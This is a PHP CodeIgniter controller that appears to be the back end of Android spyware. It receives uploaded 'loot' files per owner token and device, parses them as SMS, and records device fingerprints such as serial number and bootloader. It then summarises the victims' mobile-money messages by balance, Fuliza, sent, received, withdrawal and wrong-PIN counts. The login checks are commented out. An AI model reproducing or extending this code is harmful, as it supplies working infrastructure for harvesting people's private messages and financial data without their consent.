<?php

namespace App\Controllers;

use App\Models\ModUser;
use CodeIgniter\API\ResponseTrait;
use CodeIgniter\Controller;

use App\Models\ModUploads;
use App\Models\ModCryption;


class Upload extends BaseController
{
    use ResponseTrait;

    public function upload(){
        $mod_upload = new ModUploads();
        $mod_user = new ModUser();
        $mod_cryption = new ModCryption();
        $session = session();

        $dated = date('Y-m-d H:i:s');
        $uuid = random_string('alnum', 16);

        if (empty($session->get('user_name'))){
            //return "Not Logged In";
        }

        if ($this->request->getPost()){
            //$loot_owner = $mod_user->user_get_id($this->request->getVar('varToken'));
            $loot_owner = $this->request->getVar('varToken');
            $loot_device = $this->request->getVar('varDevId');

            $uploaded_File = $this->request->getFile('varLoot');

            $uploaded_File->move(WRITEPATH . 'uploads/txt_loot');

            $data = [
                'loot_Name' =>  $uploaded_File->getName(),
                'loot_Type'  => $uploaded_File->getClientMimeType(),
                'loot_Extension'  => $uploaded_File->getClientExtension(),
                'loot_Size'  => $uploaded_File->getSize(),
                'loot_Owner'  => $loot_owner,
                'loot_Uuid'  => $uuid,
                'loot_Device'  => $loot_device,
                'loot_Created'  => $dated
            ];

            $pushed = $mod_upload->file_upload($data);
            $loot_uuid = $uuid; //$mod_upload->loot_last_uploaded();
            $mod_upload->loot_parse_sms($loot_uuid, $loot_owner, $loot_device, $dated);
            
            if ($pushed){
                return $this->respond([
                    'status' => 1,
                    'time' => $dated,
                    'message' => "File Uploaded Successfully"
                ]);
            }else{
                return $this->respond([
                    'status' => 0,
                    'time' => $dated,
                    'message' => "File Uploaded has encountered an error"
                ]);
            }

        }else{
            return $this->respond([
                'status' => 2,
                'time' => $dated,
                'message' => "Unexpected request sent"
            ]);
        }
    }

    public function device_print(){
        $mod_upload = new ModUploads();
        $mod_crypt = new ModCryption();
        $session = session();

        $dated = date('Y-m-d H:i:s');
        $uuid = random_string('alnum', 16);

        if (empty($session->get('user_name'))){
            //echo "Not Logged In";
        }

        if ($this->request->getPost()){
            $d_info['device_Device'] = $this->request->getVar('device_Device');
            $d_info['device_Uuid'] = $uuid;
            $d_info['device_Created_At'] = $dated;
            $d_info['device_Product'] = $this->request->getVar('device_Product');
            $d_info['device_Bootloader'] = $this->request->getVar('device_Bootloader');
            $d_info['device_Type'] = $this->request->getVar('device_Type');
            $d_info['device_Tags'] = $this->request->getVar('device_Tags');
            $d_info['device_Host'] = $this->request->getVar('device_Host');
            $d_info['device_Display'] = $this->request->getVar('device_Display');
            $d_info['device_Hardware'] = $this->request->getVar('device_Hardware');
            $d_info['device_Fingerprint'] = $this->request->getVar('device_Fingerprint');
            $d_info['device_Manufacturer'] = $this->request->getVar('device_Manufacturer');
            $d_info['device_Brand'] = $this->request->getVar('device_Brand');
            $d_info['device_Board'] = $this->request->getVar('device_Board');
            $d_info['device_User'] = $this->request->getVar('device_User');
            $d_info['device_Model'] = $this->request->getVar('device_Model');
            $d_info['device_Time'] = $this->request->getVar('device_Time');
            $d_info['device_Serial'] = $this->request->getVar('device_Serial');

            $dev_check = $mod_upload->device_check_print($d_info);
            if (empty($dev_check)){
                $dev_make = $mod_upload->device_make_print($d_info);
                if ($dev_make){
                    $dev_check = $mod_upload->device_check_print($d_info);
                    return $this->respond([
                        'status' => 1,
                        'message' => "New Id assigned device_id as ",
                        //'print_id' => $dev_check[0]->device_Id,
                        'print_id' => $dev_check[0]->device_Uuid,
                        'time' => $dated,
                    ]);
                }else{}
            }else{
                return $this->respond([
                    'status' => 1,
                    'message' => "Old Id re-assigned device_id as ",
                    //'print_id' => $dev_check[0]->device_Id,
                    'print_id' => $dev_check[0]->device_Uuid,
                    'time' => $dated,
                ]);
            }
        }else{
            return $this->respond([
                'status' => 2,
                'time' => $dated,
                'message' => "Unexpected request sent"
            ]);
        }
    }

    public function upload_listing(){
        $mod_upload = new ModUploads();
        $mod_cryption = new ModCryption();
        $mod_user = new ModUser();

        $session = session();

        #echo "Username as ".$this->session->get('user_name').$session->get('user_name');

        if (empty($session->get('user_name'))){
            #echo "Not Logged In";
        }

        if ($this->request->getPost()){
            $summ_owner_uuid = $this->request->getVar('varUser');
            $summ_device = $this->request->getVar('varDev');
            $summ_owner = $mod_user->user_get_id($summ_owner_uuid);

            $loot_array = array();
            $loot_list = $mod_upload->file_listing($summ_owner_uuid, $summ_device);
            echo '{ "summarizer":[';
            $counter = 0;
            $loot_size = count($loot_list);
            foreach ($loot_list as $loot_info) {
                $counter +=1;
                $loot_meta = $mod_upload->loot_summary($loot_info->loot_Uuid); //tbl_Loot_Summary
                $data = [
                    'summary_Name' =>  $loot_info->loot_Name,
                    //'summary_Type'  => $loot_info->loot_Type,
                    //'summary_Extension'  => $loot_info->loot_Extension,
                    //'summary_Size'  => $loot_info->loot_Size,
                    //'summary_Owner'  => $loot_info->loot_Owner,
                    //'summary_Device'  => $loot_info->loot_Device,
                    'summary_Created'  => $loot_info->loot_Created,
                    'summary_Count'  => $loot_meta[0]->info_All,
                    'summary_Received'  => $loot_meta[0]->info_Received,
                    'summary_Sent'  => $loot_meta[0]->info_Sent,
                    'summary_Unknown' => $loot_meta[0]->info_Unknown
                ];
                array_push($loot_array,$data);
                if ($counter == ($loot_size)){
                    print json_encode($data);
                }else{
                    print json_encode($data).",";
                }
            }
            //print_r($loot_array);
            echo "]}";
            //echo json_encode($loot_array);
        }
    }

    public function upload_summary_calculation(){
        $mod_upload = new ModUploads();
        $mod_cryption = new ModCryption();
        $mod_user = new ModUser();

        $session = session();

        $dated = date('Y-m-d H:i:s');

        #echo "Username as ".$this->session->get('user_name').$session->get('user_name');

        if (empty($session->get('user_name'))){
            #echo "Not Logged In";
        }

        if ($this->request->getPost()){
            $summ_owner_uuid = $this->request->getVar('varUser');
            $summ_device = $this->request->getVar('varDev');
            $summ_owner = $mod_user->user_get_id($summ_owner_uuid);
            $summ_loot_name = $this->request->getVar('varLootName');

            $loot__uuid = $mod_upload->get_loot_uuid($summ_loot_name);
            $loot__info = $mod_upload->loot_info_all($loot__uuid);
            $loot__summary = $mod_upload->loot_summary($loot__uuid);

            return $this->respond([
                'val_status' => 1,
                'val_all' => $loot__summary[0]->info_All,
                'val_balance' => $loot__summary[0]->info_Balance,
                'val_fuliza' => $loot__summary[0]->info_Fuliza,
                'val_received' => $loot__summary[0]->info_Received,
                'val_sent' => $loot__summary[0]->info_Sent,
                'val_withdraw' => $loot__summary[0]->info_Withdrew,
                'val_wrong_pin' => $loot__summary[0]->info_Wrong_Pin,
                'val_unknown' => $loot__summary[0]->info_Unknown,
                'val_created' => $loot__summary[0]->loot_Created,
                //'val_name' => $loot__info[0]->loot_Name,
                'time' => $dated,
            ]);
        }
    }

}
